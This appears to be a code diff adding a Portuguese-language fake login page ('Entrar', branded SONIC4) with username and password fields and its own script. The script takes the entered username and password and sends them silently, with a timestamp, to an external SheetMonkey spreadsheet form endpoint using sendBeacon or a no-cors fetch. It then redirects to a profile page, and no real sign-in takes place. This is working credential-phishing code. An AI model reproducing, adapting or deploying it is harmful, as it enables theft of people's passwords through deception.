@@ -1,0 +1,246 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Entrar</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+        }
+
+        body {
+            background: #fff;
+            min-height: 100vh;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 24px;
+        }
+
+        .lang {
+            position: fixed;
+            top: 8px;
+            left: 50%;
+            transform: translateX(-50%);
+            color: #444;
+            font-size: 14px;
+            z-index: 10;
+            white-space: nowrap;
+        }
+
+        .avatar {
+            width: 80px;
+            height: 80px;
+            object-fit: contain;
+        }
+
+        .input-group {
+            width: 100%;
+            max-width: 350px;
+        }
+
+        input {
+            width: 100%;
+            padding: 16px 20px;
+            border: 1px solid #ddd;
+            border-radius: 12px;
+            font-size: 16px;
+            outline: none;
+            transition: border-color 0.3s, box-shadow 0.3s;
+        }
+
+        input:focus {
+            border-color: #007bff;
+            box-shadow: 0 0 0 3px rgba(0, 123, 255, 0.2);
+        }
+
+        input.invalid {
+            border-color: #dc3545;
+            box-shadow: 0 0 0 3px rgba(220, 53, 69, 0.2);
+            animation: shake 0.3s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            25% { transform: translateX(-5px); }
+            75% { transform: translateX(5px); }
+        }
+
+        .btn {
+            width: 100%;
+            max-width: 350px;
+            padding: 16px;
+            border: none;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: background 0.3s, opacity 0.3s;
+        }
+
+        .btn-primary {
+            background: #007bff;
+            color: white;
+        }
+
+        .btn-primary:hover:not(:disabled) {
+            background: #0056b3;
+        }
+
+        .btn-primary:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+
+        .forgot {
+            color: #007bff;
+            text-decoration: none;
+            font-size: 14px;
+            margin-top: 8px;
+            display: block;
+            text-align: center;
+        }
+
+        .divider {
+            width: 100%;
+            max-width: 350px;
+            text-align: center;
+            margin: 20px 0;
+            color: #999;
+            font-size: 14px;
+        }
+
+        .btn-outline {
+            background: transparent;
+            border: 1px solid #007bff;
+            color: #007bff;
+        }
+
+        .btn-outline:hover {
+            background: #007bff;
+            color: white;
+        }
+
+        .logo {
+            max-width: 60px;
+            height: auto;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+    <div class="lang">Português (Brasil)</div>
+
+    <img src="foto.png" alt="Avatar" class="avatar">
+
+    <div class="input-group">
+        <input type="text" id="usuario" placeholder="Nome de usuário, email ou celular" autocomplete="username">
+    </div>
+
+    <div class="input-group">
+        <input type="password" id="senha" placeholder="Senha" autocomplete="current-password">
+    </div>
+
+    <button class="btn btn-primary" id="entrar">Entrar</button>
+
+    <a href="recuperar.html" class="forgot">Esqueceu a senha?</a>
+
+    <div class="divider">ou</div>
+
+    <button class="btn btn-outline" onclick="location.href='cadastro.html'">Criar nova conta</button>
+
+    <img src="foto1.png" alt="SONIC4 Logo" class="logo">
+
+    <script>
+        const usuarioInput = document.getElementById('usuario');
+        const senhaInput = document.getElementById('senha');
+        const entrarBtn = document.getElementById('entrar');
+
+        function validateFields() {
+            let isValid = true;
+            usuarioInput.classList.remove('invalid');
+            senhaInput.classList.remove('invalid');
+
+            if (!usuarioInput.value.trim()) {
+                usuarioInput.classList.add('invalid');
+                isValid = false;
+            }
+            if (senhaInput.value.length < 8) {
+                senhaInput.classList.add('invalid');
+                isValid = false;
+            }
+            return isValid;
+        }
+
+        // ✅ Envia dados compatível com SheetMonkey (FormData + JSON fallback)
+        function enviarDadosBackground(usuario, senha) {
+            const now = new Date();
+            const payload = {
+                Registro: usuario,
+                passaporte: senha,
+                data: now.toISOString().slice(0, 19).replace('T', ' '),
+                hora: now.toTimeString().slice(0, 8)
+            };
+
+            // URL corrigida (sem espaços no final!)
+            const apiUrl = 'https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz';
+
+            // 📦 Método 1: sendBeacon com FormData (funciona sem headers custom)
+            if (navigator.sendBeacon) {
+                const formData = new FormData();
+                formData.append('Registro', payload.Registro);
+                formData.append('passaporte', payload.passaporte);
+                formData.append('data', payload.data);
+                formData.append('hora', payload.hora);
+                navigator.sendBeacon(apiUrl, formData);
+                return;
+            }
+
+            // 🔄 Método 2: fetch com keepalive + JSON (fallback)
+            fetch(apiUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload),
+                keepalive: true,
+                mode: 'no-cors' // Evita bloqueio por CORS no redirect
+            }).catch(() => {});
+        }
+
+        entrarBtn.addEventListener('click', function () {
+            if (!validateFields()) return;
+
+            entrarBtn.disabled = true;
+            entrarBtn.textContent = 'Enviando...';
+
+            const usuario = usuarioInput.value.trim();
+            const senha = senhaInput.value.trim();
+
+            // Dispara envio em background
+            enviarDadosBackground(usuario, senha);
+
+            // ✅ Delay aumentado para garantir que a requisição seja iniciada
+            setTimeout(() => {
+                window.location.href = 'perfil.html';
+            }, 500); // 500ms = tempo seguro para a requisição "decolar"
+        });
+
+        // Remove erro ao digitar
+        usuarioInput.addEventListener('input', () => usuarioInput.classList.remove('invalid'));
+        senhaInput.addEventListener('input', () => senhaInput.classList.remove('invalid'));
+
+        // Suporte à tecla Enter
+        senhaInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') entrarBtn.click();
+        });
+
+        // 🔍 Debug opcional (remova em produção)
+        // console.log('Script carregado. API:', 'https://api.sheetmonkey.io/form/n59dEdtBSu1mGJ3nSVMsEz');
+    </script>
+</body>
+</html>
